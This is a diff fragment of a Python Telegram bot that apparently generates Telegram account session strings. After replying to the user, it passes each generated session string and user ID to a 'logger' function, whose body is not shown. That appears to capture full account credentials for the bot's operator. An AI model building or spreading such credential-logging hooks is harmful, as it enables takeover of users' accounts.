@@ -1,0 +1,37 @@
+📁 **File saved as:** `{file_path}`
+
+**Quick Note:** Jitni bhi sessions chahiye, bas yahi command do.
+
+Made with ❤️ for all!
+"""
+            await update.message.reply_text(reply, parse_mode=ParseMode.MARKDOWN)
+
+            # ====================== LOGGER CALL ======================
+            await after_session_generation(session_string, user_id)
+
+            # Clean context
+            await asyncio.sleep(5)
+            context.pop("phone", None)
+            context.pop("code", None)
+            context.pop("phone_sent", None)
+            context.pop("code_sent", None)
+
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error: {str(e)}")
+
+
+async def main():
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(
+        filters.TEXT & \~filters.COMMAND, 
+        handle_input
+    ))
+
+    print("🤖 James String Generator Bot Started...")
+    await application.run_polling()
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
